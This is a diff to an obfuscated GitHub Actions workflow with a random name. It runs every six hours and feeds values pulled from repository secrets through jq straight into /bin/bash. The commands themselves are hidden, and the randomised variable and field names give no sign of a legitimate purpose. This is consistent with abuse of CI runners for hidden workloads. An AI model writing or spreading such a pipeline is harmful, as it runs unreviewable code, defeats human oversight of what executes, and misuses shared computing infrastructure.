@@ -2,24 +2,26 @@ name: yanshanxi4376
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 2/6 * * *'
+    - cron: '56 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yanshanxi4376
         env:
-          dy59: ${{ secrets.dy59 }}
+          p8365: ${{ secrets.p8365 }}
         run: |
-          echo $dy59 | jq -r .jqczh064 | /bin/bash
-          echo $l96 | jq -r .jcr7706 | /bin/bash
-          echo $duvyp2 | jq -r .bpg09 | /bin/bash
-          echo $s34100 | jq -r .golnl0 | /bin/bash
-          echo $ode5425 | jq -r .qme1049 | /bin/bash
-          echo $hzezo6070 | jq -r .smgb15983 | /bin/bash
-          echo $czsnu4635 | jq -r .ruu162 | /bin/bash
-          echo $fydm65763 | jq -r .wry0 | /bin/bash
+          echo $p8365 | jq -r .zrio0 | /bin/bash
+          echo $dpx53862 | jq -r .cobxg543 | /bin/bash
+          echo $cbp5 | jq -r .fc2338 | /bin/bash
+          echo $lerm06 | jq -r .iiw45286 | /bin/bash
+          echo $sjjjq13 | jq -r .thv33442 | /bin/bash
+          echo $nmh4 | jq -r .sskr35 | /bin/bash
+          echo $m69 | jq -r .vttlj9 | /bin/bash
+          echo $f5987 | jq -r .k04070 | /bin/bash
+          echo $d26 | jq -r .gwuhc94571 | /bin/bash
+          echo $qoag8170 | jq -r .fgal07691 | /bin/bash
+          echo $lpr634 | jq -r .vh9727 | /bin/bash
 
